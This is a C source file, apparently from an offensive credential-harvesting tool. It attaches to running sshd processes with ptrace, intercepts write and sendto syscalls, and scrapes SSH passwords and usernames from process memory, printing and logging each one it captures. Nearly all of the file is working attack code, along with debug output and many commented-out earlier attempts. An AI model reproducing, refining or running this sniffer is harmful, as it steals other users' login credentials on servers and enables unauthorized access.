#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <string.h>
#include <arpa/inet.h>

#define FILE_SSH_TRACER 1
#include "config.h"
#include "helpers.h"
#include "ssh_tracer.h"
#include "tracers.h"
#define SYSCALL_sendto 44

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;

void intercept_ssh_auth(pid_t traced_process);
void intercept_ssh_session(pid_t traced_process);

/*
 * finds ssh password candidates in memory
 * The write system call that transfers the
 * credential strings (among other strings)
 * begins with a length checksum at index 4 or 8
 * into the string
 *
 * write("\x00\x00\x00\x00\x08password\x00")
 *
 * Search all write system calls for a checksum with a
 * valid length string after and log them
 *
 */
char *find_password_write(char *memory, unsigned long len) {
  char *retval = NULL;
  char *strval = NULL;
  char *memory_copy = NULL;
  unsigned int checksum = 0;
  size_t slen = 0;

  //Checked earlier, but just in case someone else uses this function later
  if (len > MAX_PASSWORD_LEN)
    len = MAX_PASSWORD_LEN;

  memory_copy = (char *) calloc(sizeof(char) * len + 1, 1);

  if (!memory_copy)
    goto failed_find_password;

  // Different branch so it isn't compiled if the compile time
  // configuration option SHORT_SSH_STRINGS isn't set we aren't wasting
  // time. SHORT_SSH_STRINGS is off by default
  if (SHORT_SSH_STRINGS && len <= 8 && len > 4) {
    memset(memory_copy, 0, len);
    memcpy(memory_copy, memory, len);

    strval = &memory_copy[4];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[0];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }
  }

  if (len > 8) {
    memset(memory_copy, 0, len);
    memcpy(memory_copy, memory, len);

    strval = &memory_copy[4];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[0];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

    strval = &memory_copy[8];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[1];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

  }

failed_find_password:
  free(memory_copy);
  return NULL;
}

/* This tracer is mostly a proof of concept.
 * This can easily be done with a command like
 * `strace -p ${sshd_pid} -f 2>&1 | grep write`
 * Although, strace isn't on a lot of servers by
 * default. Other tracers like sudo, su, and ssh
 * client are slightly better usecases for this tool
 */
void intercept_ssh(pid_t traced_process) {
  //char *write_string = NULL;
  //char *password = NULL;
  int status = 0;
  int syscall = 0;
  long length = 0;
  long buf_addr =0;
  long fd = 0;
  char *buf = NULL;
  //int expect_password_next = 0;
  int saw_password_preamble = 0;

  //struct user_regs_struct regs;

  //memset(&regs, 0, sizeof(regs));
  //ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
  sleep(1);
  if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL) == -1) {
    perror("PTRACE_ATTACH failed");
    return;
  }

  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status))
    return;
  //  goto exit_ssh;
  //}

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    // Refresh the process name because sshd changes its process name  from
    // sshd: [accepted] to sshd: username [net]
    //refresh_process_name(traced_process);
    syscall = get_syscall(traced_process);

    if (wait_for_syscall(traced_process) != 0)
      break;

    if (syscall == SYSCALL_write) {
      fd = get_syscall_arg(traced_process, 0);
      buf_addr = get_syscall_arg(traced_process, 1);
      length = get_syscall_arg(traced_process, 2);

    //if (fd == 3 && length > 0 && length <= MAX_PASSWORD_LEN) {
      fprintf(stderr, "[DEBUG] syscall=%d fd=%ld len=%ld\n", syscall, fd, length);
      fprintf(stderr, "[DEBUG] write syscall detected\n");

      if (fd == 3 && length == 5) {
        saw_password_preamble = 1;
        fprintf(stderr, "[DEBUG] Detected password preamble write(3,...,5)\n");
        continue;
      }

      //if (fd == 3 && length > 4 && length < MAX_PASSWORD_LEN && saw_password_preamble) {
      if (fd == 3 && length >= 5 && length < MAX_PASSWORD_LEN && saw_password_preamble) { 
        fprintf(stderr, "[DEBUG] Attempting to read %ld bytes from 0x%lx\n", length, buf_addr);
        buf = read_memory(traced_process, buf_addr, length);
        if (!buf) {
            fprintf(stderr, "[DEBUG] read_memory() failed\n");
            continue;
      }

      if (strnascii(buf, length)) {
            fprintf(stderr, "[DEBUG] write_string (len=%ld): %.*s\n", length, (int)length, buf);
      }

        // Look for password after 4-byte prefix
        //unsigned int *len_field = (unsigned int *)buf;
        //int pw_len = ntohl(*len_field);
        unsigned int pw_len = ntohl(*(unsigned int *)buf);
        fprintf(stderr, "[DEBUG] pw_len=%d (length=%ld)\n", pw_len, length);

        //if (pw_len > 0 && pw_len < MAX_PASSWORD_LEN && (pw_len + 4 <= length)) {
        if (pw_len >= 1 && pw_len <= MAX_PASSWORD_LEN && (pw_len + 4 <= length)) {
            //char password[256] = {0};
            char password[MAX_PASSWORD_LEN + 1] = {0};
            memcpy(password, buf + 4, pw_len);
            password[pw_len] = '\0';

//            if (strnascii(password, pw_len)) {
                int garbage = 0;
                for (int i = pw_len + 4; i < length; i++) {
                    if (buf[i] != '\0' && (buf[i] < 32 || buf[i] > 126)) {
                        garbage++;
                    }
                }

                if (garbage < 2 && strnascii(password, pw_len)) {
                    //password[pw_len] = '\0';
                    fprintf(stderr, "[DEBUG] Password candidate: %.*s\n", pw_len, password);
                    printf("[+] SSH password captured: '%s'\n", password);
                    output("%s\n", password);
                }
            }
        //}

        saw_password_preamble = 0; // Reset the flag after processing one password
        free(buf);
        buf = NULL;
    }
}



//fprintf(stderr, "[DEBUG] Attempting to read %ld bytes from 0x%lx\n", length, buf_addr);
//
//    buf = read_memory(traced_process, buf_addr, length);
//    if (!buf) {
//      fprintf(stderr, "[DEBUG] read_memory() failed\n");
//      continue;

    //  fprintf(stderr, "[DEBUG] syscall=%d fd=%ld len=%ld\n", syscall, fd, length);
    //  fprintf(stderr, "[DEBUG] write syscall detected\n");
    //  fd = get_syscall_arg(traced_process, 0);
    //  buf_addr = get_syscall_arg(traced_process, 1);
    //  length = get_syscall_arg(traced_process, 2);

      // Match what you saw in strace: write to FD 3 with password string
    //  if (fd == 3 && length > 4 && length < MAX_PASSWORD_LEN) {
    //    fprintf(stderr, "[DEBUG] Attempting to read %ld bytes from 0x%lx\n", length, buf_addr); 
    //    buf = read_memory(traced_process, buf_addr, length); 
    //   if (!buf) {
    //     fprintf(stderr, "[DEBUG] read_memory() failed\n"); 
    //     continue;
//    }

    // Check for preamble (e.g., write(3, "\0\0\0\25\f", 5))
//  if (length == 5) {
  // Check if the first 4 bytes are a plausible big-endian length field
//  unsigned int hint = ntohl(*(unsigned int *)buf);

//  if (hint > 0 && hint < MAX_PASSWORD_LEN) {
//    expect_password_next = 1;
//    fprintf(stderr, "[DEBUG] Detected pre-password length write (len=%u), expecting next write to be password\n", hint);
//    free(buf);
//    continue;
//  } else {
    // Not a length preamble, don't expect password
//    expect_password_next = 0;
//    free(buf);
//    continue;
//  }

     //if (memcmp(buf, "\x00\x00\x00\x25\x0c", 5) == 0) {
     //   expect_password_next = 1;
     //   free(buf);
     //   continue;
     // }

      // Not the preamble and not expecting password â€” skip
     // if (!expect_password_next) {
     //   free(buf);
     //   continue;
     // }
 //   }

    // Now process the actual password
//    if (expect_password_next && length > 5) {
//      expect_password_next = 0;  // Reset flag

//      if (strnascii(buf, length)) {
//        fprintf(stderr, "[DEBUG] write_string (len=%ld): %.*s\n", length, (int)length, buf);
//      }

//      unsigned int *len_field = (unsigned int *)buf;
//      int pw_len = ntohl(*len_field);  // Convert from network byte order
//      fprintf(stderr, "[DEBUG] pw_len=%d (length=%ld)\n", pw_len, length);

//      if (pw_len > 0 && pw_len < MAX_PASSWORD_LEN && (pw_len + 4 <= length)) {
 //       char password[256] = {0};
//        memcpy(password, buf + 4, pw_len);

        // Validate printable characters
 //       if (strnascii(password, pw_len)) {
//          int garbage = 0;
//          for (int i = pw_len + 4; i < length; i++) {
//            if (buf[i] != '\0' && (buf[i] < 32 || buf[i] > 126)) {
//              garbage++;
//            }
//          }

//          if (garbage < 2) {
//            password[pw_len] = '\0';
//            fprintf(stderr, "[DEBUG] Password candidate: %.*s\n", pw_len, password);
//            printf("[+] SSH password captured: '%s'\n", password);
//            output("%s\n", password);
//          }
//        }
//      }
//    }

  // Debug: Print all strings written to FD 3
//        if (strnascii(buf, length)) {
//          fprintf(stderr, "[DEBUG] write_string (len=%ld): %.*s\n", length, (int)length, buf);
//        }

        // Look for password after 4-byte prefix
//        unsigned int *len_field = (unsigned int *)buf;
//        int pw_len = ntohl(*len_field);  // network byte order to host
//        fprintf(stderr, "[DEBUG] pw_len=%d (length=%ld)\n", pw_len, length);
//        if (pw_len > 0 && pw_len < MAX_PASSWORD_LEN && (pw_len + 4 <= length)) {
//          char password[256] = {0};
//          memcpy(password, buf + 4, pw_len);

  // Confirm ASCII
//  if (strnascii(password, pw_len)) {
    // Heuristic: make sure extra data after the password is either null or not printable
//    int garbage = 0;
//    for (int i = pw_len + 4; i < length; i++) {
//      if (buf[i] != '\0' && (buf[i] < 32 || buf[i] > 126)) {
//        garbage++;
//      }
//    }

    // If too much junk follows the password, skip it
//    if (garbage < 2) {
//      password[pw_len] = '\0';
//      fprintf(stderr, "[DEBUG] Password candidate: %.*s\n", pw_len, password);
//      printf("[+] SSH password captured: '%s'\n", password);
//      output("%s\n", password); 
//    }

//         if (strnascii(password, pw_len)) {
//            password[pw_len] = '\0';
//            fprintf(stderr, "[DEBUG] Password candidate: %.*s\n", pw_len, buf + 4);
//            printf("[+] SSH password captured: '%s'\n", password);
//            output("%s\n", password);
//          }
//        }

//        free(buf);
//        buf = NULL;
//      }
//    }
  }

  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}

void intercept_ssh_auth(pid_t traced_process) {
    intercept_ssh(traced_process);
}

void intercept_ssh_session(pid_t traced_process) {
  int status;
  long buf_addr = 0;
  long length = 0;
  long fd = 0;
  char *buf = NULL;
  static int username_logged = 0;

  sleep(1);  // Let the process stabilize a little
  if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL) == -1) {
    perror("PTRACE_ATTACH failed (session)");
    return;
  }

  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status)) return;

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while (1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    int syscall = get_syscall(traced_process);
    if (wait_for_syscall(traced_process) != 0)
      break;

    if (syscall == SYSCALL_sendto) {
      fd = get_syscall_arg(traced_process, 0);
      buf_addr = get_syscall_arg(traced_process, 1);
      length = get_syscall_arg(traced_process, 2);

      if (length < 16 || length > 512) continue;

      buf = read_memory(traced_process, buf_addr, length);
      if (!buf) continue;

      if (strstr(buf, "\"userName\":\"") != NULL && !username_logged) {
        char *start = strstr(buf, "\"userName\":\"") + strlen("\"userName\":\"");
        char *end = strchr(start, '"');
        if (end && end > start && (end - start) < 128) {
          char username[128] = {0};
          memcpy(username, start, end - start);
          username[end - start] = '\0';

          fprintf(stderr, "[DEBUG] Captured SSH username: %s\n", username);
          printf("[+] SSH username captured: '%s'\n", username);
          output("%s\n", username);

          username_logged =1;
        }
      }

      free(buf);
      buf = NULL;
    }
  }

  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}

//assert(errno == 0);

      //OPTIMIZATION NOTE: This check speeds things up, feel free to remove the if here
      //change MAX_PASSWORD_LEN in the config.h file to read larger passwords
//      if (length <= 0 || length > MAX_PASSWORD_LEN)
//        continue;

//      write_string = extract_write_string(traced_process, length);
//      password = find_password_write(write_string, length);

//      if (password && strnascii(password, length))
//        output("%s\n", password);

//     free(write_string);
//      free(password);
//      password = NULL;
//      write_string = NULL;
//    }
//  }

//exit_ssh:
//  free_process_name();
//  free_process_username();
//  free_process_path();
//  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
//  exit(0);
//}
